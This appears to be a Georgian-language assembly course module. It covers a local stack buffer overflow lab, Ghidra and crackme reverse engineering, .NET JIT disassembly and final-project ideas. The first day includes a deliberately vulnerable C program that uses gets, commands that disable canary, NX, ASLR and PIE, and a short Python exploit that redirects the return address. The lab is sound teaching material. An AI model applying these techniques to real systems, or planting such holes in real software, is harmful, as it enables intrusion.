# IV კვირა: Reverse Engineering და .NET-თან კავშირი

> **დონე:** საშუალო-მოწინავე (I, II, III კვირები აუცილებელია)
> **დრო:** ~10 საათი
> **მიზანი:** გაიგო, როგორ კითხულობენ სხვის კოდს, როგორ მუშაობს JIT და
> ააგო ფინალური პროექტი.

> 🔤 **ამ კვირის ახალი ტერმინები** (ყველა ახსნილია [`GLOSSARY.md`](GLOSSARY.md)-ში —
> გახსენი გვერდით, სანამ დაიწყებ): **buffer overflow** · **return address** ·
> **saved rip** · **stack canary** · **NX** · **ASLR** · **PIE** ·
> **`gets` / `fgets`** · **payload / exploit / shellcode / patch** ·
> **little-endian** · **`objdump`, `nm`, `strings`, `readelf`, `ltrace`** ·
> **disassembler / decompiler / Ghidra** · **entry point** · **jump table** ·
> **JIT / AOT / tiered compilation** · **bounds check / null check** ·
> **`Span<T>`**.
>
> ამ კვირაში წინა სამი კვირის ცოდნა მუდმივად გამოგადგება (`rbp`, `rsp`, `rip`,
> `test`, `xor`, `jle`…). თუ რომელიმე დაივიწყე — ლექსიკონშია.

---

## 🧭 სანამ დაიწყებ

- **ეთიკური შენიშვნა:** Buffer overflow და reverse engineering ტექნიკები
  გამოიყენე **მხოლოდ შენს პროგრამებზე** ან ლეგალურ პლატფორმებზე
  (crackmes.one, pwn.college). სხვისი სისტემის გატეხვა დანაშაულია.
- დარწმუნდი, რომ III კვირის checklist სრულად გაქვს.
- ამ კვირაში **დასკვნითი პროექტი** გაქვს — დრო დაგჭირდება (IV-V დღეები).
- Docker-ში ყველაფერი მუშაობს, მაგრამ buffer overflow-ისთვის შეიძლება
  დაგჭირდეს `--privileged` (Docker-ს მეტი უფლება) ან სპეციალური flags
  ASLR-ის გამო.

---

## I დღე: Buffer overflow (მხოლოდ შენს ლოკალურ პროგრამაზე)

### 1. Stack-ის სტრუქტურა ფუნქციის შიგნით

```

მაღალი მისამართები
...
[ არგუმენტები (7+) ]
[ return address ] <- ეს გადაიწერება overflow-ის დროს
[ შენახული rbp ] <- rbp
[ ლოკალური ცვლადები ]
[ buffer[64] ] <- rsp (ზრდადი მისამართებისკენ)
დაბალი მისამართები

```

`char buffer[64]` რომ overflow-ს განიცდის, ზედმეტი ბაიტები ავსებენ:

1. buffer-ის დანარჩენ ადგილს
2. ლოკალურ ცვლადებს
3. შენახულ `rbp`-ს
4. **return address-ს** ← აქ არის ხიბლი

### 2. ვინ იცავს

| დაცვა               | რას აკეთებს                                                             | როგორ გამორთო (სწავლისთვის)                    |
| ------------------- | ----------------------------------------------------------------------- | ---------------------------------------------- |
| **Stack canary**    | buffer-სა და return address-ს შორის ცნობილი ნომერი; თუ შეიცვალა → abort | `-fno-stack-protector`                         |
| **NX (No eXecute)** | stack-ზე შესრულებადი კოდის აკრძალვა                                     | `-z execstack`                                 |
| **ASLR**            | stack-ის მისამართები შემთხვევითია                                       | `setarch -R ./prog` ან `echo 0 \| sudo tee /proc/sys/kernel/randomize_va_space` |
| **PIE**             | კოდის მისამართებიც შემთხვევითი                                          | `-no-pie`                                      |

**ჩვეულებრივ, ყველა ჩართულია.** სწავლისთვის, ყველას გამორთავ. ყოველი ეს ტერმინი
(და რატომ თიშავენ მათ მხოლოდ სასწავლოდ) ახსნილია [`GLOSSARY.md`](GLOSSARY.md)-ში.

### 3. მოწყვლადი პროგრამა

```c
// vuln.c
#include <stdio.h>
#include <string.h>

void secret(void) {
    printf("You reached secret!\n");
}

void vulnerable(void) {
    char buffer[64];
    gets(buffer);           // ⚠️ საშიში ფუნქცია — არ ამოწმებს სიგრძეს
    printf("You said: %s\n", buffer);
}

int main(void) {
    vulnerable();
    return 0;
}
```

კომპილაცია (დაცვების გარეშე, სწავლისთვის):

```bash
gcc -fno-stack-protector -z execstack -no-pie -o vuln vuln.c
```

### 4. როგორ იმუშაოს

1. **იპოვე `secret`-ის მისამართი:**

   ```bash
   objdump -d -M intel vuln | grep secret
   # 00401136 <secret>:
   ```

2. **გამოთვალე რამდენი ბაიტი სჭირდება return address-მდე:**
   - `buffer` = 64 ბაიტი
   - შენახული `rbp` = 8 ბაიტი
   - სულ: **72 ბაიტი** + 8 ბაიტი მისამართი

3. **ააგე payload:** `72 ბაიტი A` + `secret`-ის მისამართი little-endian

   ```python
   #!/usr/bin/env python3
   import sys
   payload = b"A" * 72
   payload += (0x401136).to_bytes(8, 'little')
   sys.stdout.buffer.write(payload + b"\n")
   ```

4. **გაუშვი:**

   ```bash
   python3 exploit.py | ./vuln
   # You said: AAAA...
   # You reached secret!
   ```

### 5. gdb-ში ნახვა

```
(gdb) break vulnerable
(gdb) run < payload.bin
(gdb) x/40gx $rsp         ; ნახე სად არის return address
(gdb) info frame          ; saved rip-ის მისამართი
```

`info frame` გეუბნება `saved rip at 0x7fffffffe...`. ეს არის return
address-ის ლოკაცია. გამოთვალე სხვაობა `$rsp`-სა და ამ მისამართს შორის.

### 6. გაფართოება: shellcode (სწავლისთვის)

თუ `-z execstack` გაქვს, შეგიძლია **შენი კოდი** ჩაწერო buffer-ში და return
address ისე გადაწერო, რომ buffer-ის დასაწყისში გადახტეს. ეს უფრო რთულია
(stack-ის მისამართი უნდა იცოდე). მარტივი shellcode, რომელიც `exit(42)`-ს
იძახებს:

```asm
; shellcode.asm
global _start
section .text
_start:
    mov rax, 60
    mov rdi, 42
    syscall
```

```bash
nasm -f bin shellcode.asm -o shellcode.bin
xxd shellcode.bin       # ბაიტები
```

### 🧪 დავალება

1. ააგე მოწყვლადი პროგრამა `secret` ფუნქციით.
2. იპოვე `secret`-ის მისამართი `objdump`-ით.
3. დაწერე Python exploit, რომელიც `secret`-ს გამოიძახებს.
4. gdb-ში გაიარე და ნახე, რომ return address შეიცვალა.

### 🐛 ხშირი შეცდომები

- **canary არ გამორთე** → `*** stack smashing detected ***` და abort.
- **ASLR ჩართულია** → მისამართები ყოველ გაშვებაზე იცვლება. `setarch -R ./prog`.
- **PIE ჩართულია** → `secret`-ის აბსოლუტური მისამართი უცნობია.
  `-no-pie` დააყენე.
- **byte order არასწორია** → little-endian: `36 11 40 00 00 00 00 00`.

---

## II დღე: Reverse engineering

### 1. Ghidra-ს საფუძვლები

Ghidra უფასოა (NSA-ს მიერ გამოქვეყნებული). ჩამოტვირთვა:
https://ghidra-sre.org/

**ინსტალაცია:**

1. Java JDK 17+ დააყენე
2. Ghidra გადმოწერე, ამოაარქივე
3. `./ghidraRun` (Linux) ან `ghidraRun.bat` (Windows)

**ძირითადი flow:**

1. File → New Project
2. File → Import File → აირჩიე binary
3. ორჯერ დააწკაპუნე → CodeBrowser გაიხსნება
4. "Analyze" → "Auto Analyze" (default პარამეტრები საკმარისია)
5. მარცხნივ: Functions, Symbols, Data Type Manager

### 2. Disassembly-ის წაკითხვა

**if-else-ის ამოცნობა:**

```nasm
    cmp  eax, 0x10         ; თუ eax == 16
    jne  LAB_00401200      ; არა → სხვაგან
    mov  edx, 1            ; then
    jmp  LAB_00401210
LAB_00401200:
    mov  edx, 2            ; else
LAB_00401210:
    ...
```

**ციკლის ამოცნობა:** უკან მიმართული `jmp`/`jcc` (მისამართი უფრო დაბალია):

```nasm
LAB_00401180:
    ...
    inc  ecx
    cmp  ecx, 10
    jl   LAB_00401180      ; უკან → ციკლი
```

**switch-ის ამოცნობა:** jump table — მისამართების მასივი, `jmp [rax*8 + table]`.

**ფუნქციის ამოცნობა:** `call` + `ret` + stack frame (`push rbp; mov rbp, rsp`).

### 3. Ghidra-ს decompiler

Ghidra ავტომატურად ცდილობს C კოდის აღდგენას (Decompile window). ეს არ
არის ზუსტი, მაგრამ ხშირად ძალიან კარგი მინიშნებაა:

```c
int check_password(char *input)
{
  int result;
  if (strcmp(input, "s3cr3t") == 0) {
    result = 1;
  } else {
    result = 0;
  }
  return result;
}
```

ამის წაკითხვა ბევრად უფრო ადვილია, ვიდრე asm-ის 100 ხაზი.

### 4. Crackme-ები

**crackmes.one** — ლეგალური სავარჯიშო binary-ები, სამი დონით:

- **Easy:** მხოლოდ `strcmp`-ის მსგავსი შემოწმება
- **Medium:** რამდენიმე პირობა, ციკლი
- **Hard:** კრიპტოგრაფია, ობფუსკაცია

**დაწყების რჩევა:** დაიწყე "Easy" დონიდან. ჩამოტვირთე 2-3 crackme.

**workflow:**

1. გაუშვი და ნახე, რას ითხოვს (password, key, serial).
2. `strings prog` — ნახე ყველა ტექსტური სტრიქონი.
3. Ghidra-ში გახსენი, იპოვე `main`.
4. მიჰყევი `printf`/`scanf`/`strcmp` გამოძახებებს.
5. იპოვე შემოწმების ლოგიკა.
6. სცადე სწორი password-ის პოვნა ან patch-ის გაკეთება.

### 5. `strings` და სხვა სწრაფი ინსტრუმენტები

```bash
strings prog              # ტექსტური სტრიქონები
strings -n 8 prog         # მინიმუმ 8 სიმბოლოიანები
file prog                 # binary ტიპი (ELF, PE, ...)
readelf -h prog           # ELF header
ltrace ./prog             # library call-ების tracking (strcmp, printf)
```

`ltrace` განსაკუთრებით სასარგებლოა crackme-ებისთვის — პირდაპირ აჩვენებს
რომელ არგუმენტებს გადასცემ `strcmp`-ს.

### 🧪 დავალება

1. ამოხსენი 2-3 მარტივი crackme (crackmes.one-ის უმარტივესი დონე).
2. თითოეულისთვის დაწერე: რა შემოწმება იყო, როგორ გვერდი აუარე.
3. სცადე Ghidra-ს decompiler და შეადარე შენს asm ანალიზს.

### 🐛 ხშირი სირთულეები

- **Ghidra ვერ პოულობს `main`-ს** → სცადე `entry` ფუნქციიდან დაწყება.
- **Decompiler უცნაურ C-ს აჩვენებს** → ეს ნორმალურია, ოპტიმიზაცია
  რთულია. დაეყრდენ asm-ს.
- **`strings` ვერაფერს პოულობს** → სტრიქონები დაშიფრულია ან obfuscated.

---

## III დღე: .NET JIT-ის asm

### 1. რატომ .NET

თუ C#-იდან მოდიხარ, საინტერესოა: **რას აკეთებს JIT (Just-In-Time compiler)**
შენი კოდისთვის? .NET 7+ -ში ამის ნახვა ძალიან ადვილია.

### 2. `DOTNET_JitDisasm`

გარემოს ცვლადი, რომელიც JIT-ს აიძულებს დაბეჭდოს გენერირებული asm:

```bash
export DOTNET_JitDisasm="MyMethod"
dotnet run
```

ან კონკრეტული კლასისთვის:

```bash
export DOTNET_JitDisasm="MyNamespace.MyClass:*"
```

ან ყველაფრისთვის (ხმაურიანია):

```bash
export DOTNET_JitDisasm="*"
```

**სხვა სასარგებლო env ცვლადები:**

- `DOTNET_JitStdOutFile=out.txt` — ფაილში ჩაწერე
- `DOTNET_TieredCompilation=0` — გამორთე tiered (მარტივი asm)
- `DOTNET_ReadyToRun=0` — გამორთე წინასწარ კომპილირებული კოდი

### 3. მაგალითი

```csharp
// Program.cs
using System;

class Program {
    static int Sum(int[] arr) {
        int total = 0;
        for (int i = 0; i < arr.Length; i++) {
            total += arr[i];
        }
        return total;
    }

    static void Main() {
        int[] data = { 1, 2, 3, 4, 5 };
        Console.WriteLine(Sum(data));
    }
}
```

```bash
export DOTNET_JitDisasm="Program.Sum"
dotnet run
```

**მოსალოდნელი asm (გამარტივებული):**

```nasm
; Program.Sum(int[])
    test rdi, rdi              ; null check
    je   null_error
    mov  eax, [rdi+8]          ; arr.Length (offset 8)
    xor  edx, edx              ; total = 0
    xor  ecx, ecx              ; i = 0
    test eax, eax
    jle  done
loop:
    mov  r8d, [rdi+rcx*4+16]   ; arr[i] (offset 16 = data-ის დასაწყისი)
    add  edx, r8d
    inc  ecx
    cmp  ecx, eax
    jl   loop
done:
    mov  eax, edx
    ret
null_error:
    ; throw NullReferenceException
```

**რას ამჩნევ:**

- **Null check** ციკლის დასაწყისში (C#-ის safety)
- **Bounds check** ყოველ იტერაციაზე? JIT ხშირად ოპტიმიზებს — თუ `i < Length`
  ციკლის პირობაა, მან იცის, რომ bounds-შია.
- **Array offset 16:** .NET-ის მასივს აქვს header (type, length), data იწყება
  offset 16-დან (64-ბიტზე).
- **`Length` offset 8:** მასივის header-ში.

### 4. შედარება შენს asm-თან

დაწერე იგივე ციკლი NASM-ში. შეადარე:

- JIT-ის null check (შენ არ გაქვს)
- array header-ის offset (შენ პირდაპირ მონაცემებზე მიდიხარ)
- ოპტიმიზაციები (JIT შეიძლება `add` ჩაანაცვლოს `lea`-თი)

### 5. `Span<T>` და bounds check

```csharp
static int SumSpan(Span<int> span) {
    int total = 0;
    foreach (int x in span) total += x;
    return total;
}
```

JIT ამას ხშირად **bounds check-ის გარეშე** აკომპილირებს — მაგრამ არა იმიტომ,
რომ სიგრძე კომპილაციის დროსაა ცნობილი. `Span<T>`-ის სიგრძე **გაშვების დროს**
ცნობილია (ის ხომ ჩვეულებრივი რიცხვია, რომელსაც პროგრამა კითხულობს). JIT უბრალოდ
**ხედავს, რომ ციკლის ინდექსი ვერასდროს გასცდება `span.Length`-ს**, ამიტომ
ყოველ იტერაციაზე შემოწმება ზედმეტია და შლის. სხვა სიტყვებით: ერთი შემოწმება
საკმარისია, ათასი არა. სწორედ ეს (და არა „კომპილაციის დროს ცნობილი სიგრძე“) არის
`Span<T>`-ის სისწრაფის ერთ-ერთი მიზეზი. *(`Span<T>`, bounds check, JIT — იხ.
[`GLOSSARY.md`](GLOSSARY.md).)*

### 6. რატომ არის ეს საინტერესო

- ხედავ, როგორ გარდაიქმნება მაღალი დონის კონსტრუქციები დაბალ დონეზე.
- ესმის, რატომ არის ზოგი კოდი ნელი (hidden null/bounds check).
- შეგიძლია დააოპტიმიზო C# კოდი JIT-ის გათვალისწინებით.

### 🧪 დავალება

1. დაწერე C#-ში მარტივი ციკლი (ჯამი, მაქსიმუმი, ან სტრიქონის ძებნა).
2. `DOTNET_JitDisasm`-ით ნახე JIT-ის გენერირებული asm.
3. შეადარე შენს ხელნაწერ NASM ვერსიას (იგივე ლოგიკა).
4. გამოთახე 3 განსხვავება (null check, bounds check, offset).

---

## IV-V დღე: ფინალური პროექტი

**აირჩიე ერთი** ქვემოთ ჩამოთვლილთაგან. მიზანია, რომ გამოიყენო ყველაფერი,
რაც 3 კვირაში ისწავლე: syscalls, ფუნქციები, stack, ბიტური ოპერაციები,
debugging.

### პროექტი 1: მინი shell (`fork`/`execve`)

**რას აკეთებს:**

- ბეჭდავს prompt-ს (`$ `)
- კითხულობს ხაზს stdin-დან
- `fork`-ით ქმნის შვილ პროცესს
- შვილში: `execve`-ით უშვებს ბრძანებას
- მშობელში: `wait`-ით ელოდება შვილის დასრულებას

**რას ისწავლი:**

- `fork`, `execve`, `wait4`, `read`, `write` syscalls
- Process management Linux-ზე
- ციკლი + სტრიქონების დამუშავება

**რჩევა:** დაიწყე მხოლოდ ერთი ბრძანებით (`ls`), მერე დაამატე არგუმენტები.

**syscall ნომრები (x86-64):**

- `fork` = 57
- `execve` = 59
- `wait4` = 61
- `exit` = 60

### პროექტი 2: Brainfuck ინტერპრეტატორი

**რას აკეთებს:**

- კითხულობს Brainfuck პროგრამას (ფაილიდან ან stdin-იდან)
- ინტერპრეტირებს 8 ბრძანებას: `> < + - . , [ ]`
- `[` და `]` ციკლებისთვის

**რას ისწავლი:**

- ტექსტის parsing
- `[` / `]` ბალანსის შემოწმება
- Stack-ის გამოყენება ციკლის დასაწყისის მისამართებისთვის
- ბაიტური I/O

**რჩევა:** ჯერ 6 ბრძანება (`> < + - . ,`), მერე ციკლები.

**მაგალითი პროგრამა (Hello World):**

```
++++++++[>++++[>++>+++>+++>+<<<<-]>+>+>->>+[<]<-]>>.>---.+++++++..+++.>>.<-.<.+++.------.--------.>>+.>++.
```

### პროექტი 3: Base64 encoder/decoder

**რას აკეთებს:**

- კითხულობს input-ს (stdin ან ფაილი)
- ყოველ 3 ბაიტს გადააქცევს 4 Base64 სიმბოლოდ
- ან პირიქით: 4 სიმბოლო → 3 ბაიტი

**რას ისწავლი:**

- ბიტური ოპერაციები (`shl`, `shr`, `and`, `or`)
- ცხრილებით მუშაობა (Base64 alphabet)
- ბაიტების დამუშავება ბლოკებად
- padding (`=`) დამუშავება

**ალგორითმი:**

```
3 ბაიტი:  [AAAAAAAA][BBBBBBBB][CCCCCCCC]
4 სიმბოლო: [AAaaaaaa][bbbbBBBB][ccccccCC][dddddd]
```

**რჩევა:** ჯერ encoder, მერე decoder. გამოსცადე `base64` ბრძანების წინააღმდეგ.

### პროექტი 4: Game of Life ტერმინალში

**რას აკეთებს:**

- ინიციალიზებს გრიდს (მაგ. 40x20)
- ყოველ ნაბიჯზე ითვლის მეზობლებს
- ანახლებს გრიდს Conway-ის წესებით
- ბეჭდავს ტერმინალში, ასუფთავებს ეკრანს (ANSI escape codes)

**რას ისწავლი:**

- 2D მასივებთან მუშაობა (index → offset)
- მეზობლების დათვლა (8 მიმართულება)
- ANSI escape sequences (`\x1b[2J`, `\x1b[H`)
- `nanosleep` ან `usleep` დროისთვის

**Conway-ის წესები:**

- ცოცხალი + 2 ან 3 მეზობელი → ცოცხალი
- მკვდარი + ზუსტად 3 მეზობელი → ცოცხალი
- სხვა → მკვდარი

**რჩევა:** დაიწყე მცირე გრიდით (10x10) და გამართვისთვის ბეჭდე ციფრებით.

### პროექტი 5 (ბონუსი): სხვა იდეები

- `cat` clone (ფაილის წაკითხვა და stdout-ზე გამოტანა)
- `wc` clone (სიტყვების/ხაზების დათვლა)
- `hexdump` clone
- მინი `grep` (სტრიქონის ძებნა ფაილში)
- Simple HTTP server (socket syscalls)

---

## 📝 პროექტის წარდგენის ფორმატი

ფინალური პროექტისთვის მოამზადე:

1. **საქაღალდე** `project/` შემდეგი სტრუქტურით:

   ```
   project/
   ├── README.md          ; რას აკეთებს, როგორ ააწყო, როგორ გაუშვა
   ├── Makefile
   ├── main.asm           ; ან რამდენიმე .asm ფაილი
   └── test.sh            ; ტესტები
   ```

2. **README.md** უნდა შეიცავდეს:
   - პროექტის აღწერა (2-3 წინადადება)
   - build/run ინსტრუქცია
   - მაგალითი გამოყენება
   - რა ისწავლე პროექტზე მუშაობისას

3. **test.sh** — მარტივი ტესტები:

   ```bash
   #!/bin/bash
   echo "Test 1: ..."
   ./prog < input1.txt > output.txt
   if diff output.txt expected1.txt; then
       echo "PASS"
   else
       echo "FAIL"
   fi
   ```

4. **gdb-ში გავლა:** ყოველი ფუნქცია უნდა იყოს გატესტილი gdb-ში. დაწერე
   `notes.md` ფაილში, რა ნახე.

---

## ✅ კვირის შეჯამება

**რაც უნდა შეგეძლოს IV კვირის ბოლოს:**

- [ ] მოწყვლადი C პროგრამის აგება და return address-ის გადაწერა
- [ ] canary, NX, ASLR, PIE — რას აკეთებენ და როგორ გამოირთვება
- [ ] Ghidra-ში binary-ის გახსნა და `main`-ის პოვნა
- [ ] მარტივი crackme-ის ამოხსნა (2-3 ცალი)
- [ ] `DOTNET_JitDisasm`-ით JIT-ის asm-ის ნახვა
- [ ] C# კოდისა და JIT asm-ის შედარება
- [ ] ფინალური პროექტი (ერთი ჩამოთვლილთაგან)
- [ ] პროექტის README, Makefile, ტესტები

**გილოცავ! 🎉** თუ აქამდე მოხვედი, შენ უკვე იცი Assembly, გესმის
როგორ მუშაობს CPU, stack, ფუნქციები, compiler-ები და JIT.

---

## 🚀 შემდეგი ნაბიჯები (სწავლის გაგრძელება)

- **pwn.college** — სისტემური მოდულები exploit-ებზე (უფასო)
- **ROP Emporium** — Return-Oriented Programming სავარჯიშოები
- **Intel/AMD manual** — სრული x86-64 ინსტრუქციების ცნობარი
- **Operating Systems: Three Easy Pieces** (წიგნი) — OS-ის საფუძვლები
- **Computer Systems: A Programmer's Perspective** (CS:APP) — ბიბლია
- **Writing a C Compiler** (Nora Sandler) — თუ გინდა საკუთარი compiler
